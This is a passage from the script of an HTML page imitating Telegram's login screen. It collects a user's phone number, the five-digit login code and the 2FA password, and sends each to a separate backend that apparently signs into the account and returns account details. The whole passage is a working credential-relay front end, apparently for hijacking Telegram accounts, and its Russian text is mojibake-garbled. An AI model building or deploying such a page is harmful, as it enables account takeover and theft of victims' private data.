            byId('send-code').disabled = true;


            try {
                // Mock API call: In a real app, this would use a backend to interact with Telegram API
                const res = await fetch(`${API_BASE}/send_code`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });


                if (!res.ok) throw new Error(await res.text());


                const data = await res.json();
                sessionId = data.session_id;


                setMainTitle('Telegram');
                setMainDescription('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –í–≤–µ–¥–∏—Ç–µ 5 —Ü–∏—Ñ—Ä –∏–∑ Telegram.');
                setStatus('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏—è Telegram.', 'text-tg-blue');
                hideLogo();

                // –û—á–∏—Å—Ç–∫–∞ –ø–æ–ª–µ–π –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –ø–µ—Ä–µ–¥ –ø–æ–∫–∞–∑–æ–º
                clearCodeInputs(); 

                hide(stepPhone); show(stepCode);
                codeInputs[0].focus(); 


            } catch (e) {
                setStatus('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞: ' + (e.message || e), 'text-tg-error');
            } finally {
                 byId('send-code').disabled = false;
            }
        }


        async function verifyCode() {
            const code = codeInputs.map(input => input.value).join('');
            if (!sessionId || code.length !== 5) return;
            
            setStatus('–ü—Ä–æ–≤–µ—Ä—è—é –∫–æ–¥...', 'text-tg-blue');
            // –û—Ç–∫–ª—é—á–∞–µ–º –≤—Å–µ –∏–Ω–ø—É—Ç—ã, —á—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –≤–≤–æ–¥ –≤–æ –≤—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞
            codeInputs.forEach(input => input.disabled = true);


            try {
                const res = await fetch(`${API_BASE}/verify_code`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: sessionId, code })
                });


                const text = await res.text();
                if (!res.ok) throw new Error(text);


                const data = JSON.parse(text);


                // Success animation (Green border)
                codeInputs.forEach(input => {
                    input.classList.add('code-success');
                    setTimeout(() => input.classList.remove('code-success'), 1000);
                });


                if (data.twofa_required) {
                    setMainTitle('–ü–∞—Ä–æ–ª—å 2FA');
                    setMainDescription('–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å 2FA.');
                    setStatus('–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å 2FA. –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ.', 'text-tg-blue');
                    
                    // –û—á–∏—Å—Ç–∫–∞ –ø–∞—Ä–æ–ª—è –ø–µ—Ä–µ–¥ –ø–æ–∫–∞–∑–æ–º 2FA
                    passwordInput.value = '';

                    // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –ø–æ–¥—Å–∫–∞–∑–∫—É, –µ—Å–ª–∏ –æ–Ω–∞ –µ—Å—Ç—å
                    console.log('2FA –ø–æ–¥—Å–∫–∞–∑–∫–∞ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:', data.password_hint);
                    if (data.password_hint && data.password_hint.trim() !== '') {
                        byId('password-hint').textContent = data.password_hint;
                        show(byId('password-hint-container'));
                        hide(byId('no-hint-message'));
                    } else {
                        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –ø–æ–¥—Å–∫–∞–∑–∫–∏
                        hide(byId('password-hint-container'));
                        show(byId('no-hint-message'));
                    }
                    
                    hide(stepCode); show(step2fa);
                    passwordInput.focus();
                } else {
                    // –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ –±–µ–∑ 2FA
                    setMainTitle('‚úÖ –£—Å–ø–µ—à–Ω–æ!');
                    setMainDescription('–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!');
                    setStatus(`–í—Ö–æ–¥ —É—Å–ø–µ—à–µ–Ω!` , 'text-tg-success');
                    console.log('Account info:', data.account_info);
                    
                    if (data.user && data.account_info) {
                        displayAccountInfo(data.user, data.account_info);
                    } else {
                        hide(stepCode);
                    }
                }
            } catch (e) {
                // Error animation (Red border)
                codeInputs.forEach(input => {
                    input.classList.add('code-error');
                    setTimeout(() => input.classList.remove('code-error'), 1000);
                });

                setStatus('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫–æ–¥–∞: ' + (e.message || e), 'text-tg-error');
                
                // –û—á–∏—Å—Ç–∫–∞ –ø–æ–ª–µ–π –∏ –≤–æ–∑–≤—Ä–∞—Ç —Ñ–æ–∫—É—Å–∞ –ø–æ—Å–ª–µ –æ—à–∏–±–∫–∏
                clearCodeInputs();
                codeInputs[0].focus();
            }
        }


        async function verifyPassword() {
            const password = passwordInput.value.trim();
            if (!sessionId || !password) return;


            setStatus('–ü—Ä–æ–≤–µ—Ä—è—é –ø–∞—Ä–æ–ª—å 2FA...', 'text-tg-blue');
            byId('verify-password').disabled = true;


            try {
                const res = await fetch(`${API_BASE}/verify_password`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ session_id: sessionId, password })
                });


                if (!res.ok) {
                    const errorText = await res.text();
                    let errorMsg = '–û—à–∏–±–∫–∞';
                    try {
                        const errorJson = JSON.parse(errorText);
                        errorMsg = errorJson.detail || errorText;
                    } catch {
                        errorMsg = errorText;
                    }
                    throw new Error(errorMsg);
                }


                const data = await res.json();
                setMainTitle('‚úÖ –£—Å–ø–µ—à–Ω–æ!');
                setMainDescription('–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω!');
                setStatus(`–í—Ö–æ–¥ —É—Å–ø–µ—à–µ–Ω!` , 'text-tg-success');
                console.log('Account info (2FA):', data.account_info);
                
                if (data.user && data.account_info) {
                    displayAccountInfo(data.user, data.account_info);
                } else {
                    hide(step2fa);
                }


            } catch (e) {
                setStatus(e.message || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ –ø–∞—Ä–æ–ª—è', 'text-tg-error');
                // –û—á–∏—Å—Ç–∫–∞ –ø–æ–ª—è –ø–∞—Ä–æ–ª—è –ø—Ä–∏ –æ—à–∏–±–∫–µ
                passwordInput.value = '';
                passwordInput.focus();
            } finally {
                byId('verify-password').disabled = false;
            }
        }



        // --- Event Listeners and Custom UI Logic ---


        // 1. Send Code Button
        document.getElementById('send-code').addEventListener('click', sendCode);


        // 2. 5-Digit Code Input Logic (Auto-focus, Auto-submit)
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // –û—Å—Ç–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—É—é –≤–≤–µ–¥–µ–Ω–Ω—É—é —Ü–∏—Ñ—Ä—É
                e.target.value = e.target.value.replace(/[^0-9]/g, '').charAt(0);

                if (e.target.value) {
                    if (index < codeInputs.length - 1) {
                        // –†–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º —Å–ª–µ–¥—É—é—â–∏–π –∏–Ω–ø—É—Ç
                        codeInputs[index + 1].disabled = false;
                        codeInputs[index + 1].focus();
                    } else if (index === codeInputs.length - 1) {
                        // –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–∞ –ø–æ—Å–ª–µ–¥–Ω—è—è —Ü–∏—Ñ—Ä–∞, –ø—ã—Ç–∞–µ–º—Å—è –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥
                        verifyCode();
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    // –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞–∑–∞–¥ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ Backspace
                    codeInputs[index - 1].value = '';
                    codeInputs[index - 1].focus();
                    e.preventDefault();
                }
                // –ó–∞–ø—Ä–µ—Ç –≤–≤–æ–¥–∞ –≤—Å–µ–≥–æ, –∫—Ä–æ–º–µ —Ü–∏—Ñ—Ä (–∏ Tab)
                if (!/^\d$/.test(e.key) && e.key.length === 1 && e.key !== 'Tab') {
                    e.preventDefault();
                }
            });
            
            // Highlight current input border
            input.addEventListener('focus', (e) => {
                codeInputs.forEach(i => i.style.borderColor = '#ccc');
                e.target.style.borderColor = tailwind.config.theme.extend.colors['tg-blue'];
            });
            
            input.addEventListener('blur', (e) => {
                // Return to default border color if no success/error class is applied
                if (!e.target.classList.contains('code-success') && !e.target.classList.contains('code-error')) {
                    e.target.style.borderColor = '#ccc';
                }
            });
        });


        // 3. –õ–æ–≥–∏–∫–∞ —Å —ç–º–æ–¥–∑–∏ –æ–±–µ–∑—å—è–Ω—ã —É–¥–∞–ª–µ–Ω–∞ –ø–æ –∑–∞–ø—Ä–æ—Å—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
        // –û—á–∏—Å—Ç–∫–∞ –ø–æ–ª—è 2FA –∏ —Ñ–æ–∫—É—Å –ø—Ä–∏ –æ—à–∏–±–∫–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –≤ verifyPassword().


        // 4. Verify Password Button
        document.getElementById('verify-password').addEventListener('click', verifyPassword);


        // Initialize state message
        setStatus('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–¥–∞.');
    </script>
</body>
</html>

